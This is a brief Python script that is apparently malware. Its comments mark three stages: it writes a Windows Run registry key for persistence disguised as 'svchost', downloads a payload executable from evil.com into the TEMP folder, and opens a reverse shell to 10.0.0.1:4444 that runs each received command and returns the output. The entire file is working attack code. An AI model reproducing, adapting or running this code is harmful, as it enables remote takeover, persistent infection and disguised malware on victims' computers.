
import subprocess, os, socket, urllib.request

# Persistence
os.system('reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /d "%TEMP%\\svchost.exe"')

# Download payload
urllib.request.urlretrieve("http://evil.com/payload.exe", os.environ["TEMP"] + "\\svchost.exe")

# Reverse shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
while True:
    cmd = s.recv(1024).decode()
    result = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(result.stdout + result.stderr)
